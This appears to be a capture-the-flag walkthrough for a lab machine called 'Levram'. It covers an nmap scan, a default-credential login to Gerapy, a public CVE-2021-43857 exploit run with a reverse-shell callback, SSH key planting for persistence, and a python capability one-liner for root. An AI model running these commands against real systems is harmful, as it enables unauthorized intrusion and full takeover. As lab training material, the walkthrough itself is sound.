---
icon: ubuntu
---

# Levram - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.174.24 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 19:24 EDT
Nmap scan report for 192.168.174.24
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   28.95 ms 192.168.45.1
2   28.70 ms 192.168.45.254
3   29.05 ms 192.168.251.1
4   38.14 ms 192.168.174.24
```

### <mark style="color:$primary;">HTTP Port 8000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2227).png" alt=""><figcaption></figcaption></figure>

Upon visiting the site we are meet with a login page we're default admin:admin credentials work and it redirects us to the following page

<figure><img src="../../.gitbook/assets/image (2225).png" alt=""><figcaption></figcaption></figure>

There is a version available at the bottom of the page, I am going to search for an exploit

<figure><img src="../../.gitbook/assets/image (2228).png" alt=""><figcaption></figcaption></figure>

The following GitHub [**Repo**](https://github.com/LongWayHomie/CVE-2021-43857.git) offers a short overview of the CVE and a poc. I am going to clone it and give it a try

```
git clone https://github.com/LongWayHomie/CVE-2021-43857.git
```

The Guide says that the exploit will fail if there are no projects so let's create on first before running the poc

<figure><img src="../../.gitbook/assets/image (2229).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2230).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready to catch the shell before running the exploit

```
python3 cve-2021-43857.py -t 192.168.174.24 -p 8000 -L 192.168.45.158 -P 8000
```

<figure><img src="../../.gitbook/assets/image (2231).png" alt=""><figcaption></figcaption></figure>

Huh, it seems the exploit created a listener and caught the shell.

### <mark style="color:$primary;">Generating SSH key</mark>

I am going to generate an ssh key for app, to get a better shell and for ease of login in case my shell collapses. Make a .ssh directory and cd into it after run the following commands:

```
ssh-keygen -t rsa -b 2048 -f ./id_rsa -N ""
```

<figure><img src="../../.gitbook/assets/image (2232).png" alt=""><figcaption></figcaption></figure>

```
cat id_rsa.pub >> authorized_keys
chmod 600 authorized_keys
cat id_rsa
```

<figure><img src="../../.gitbook/assets/image (2233).png" alt=""><figcaption></figcaption></figure>

copy the key to your machine and use it to ssh

<figure><img src="../../.gitbook/assets/image (2234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2235).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

In order to save time, I am going to run linpeas

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (2236).png" alt=""><figcaption></figcaption></figure>

Linpeas reveals a python capability! [**GTFObins** ](https://gtfobins.github.io/gtfobins/python/#capabilities)has a detailed solution for us

<figure><img src="../../.gitbook/assets/image (2237).png" alt=""><figcaption></figcaption></figure>

```
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

<figure><img src="../../.gitbook/assets/image (2238).png" alt=""><figcaption></figcaption></figure>

And we got root!
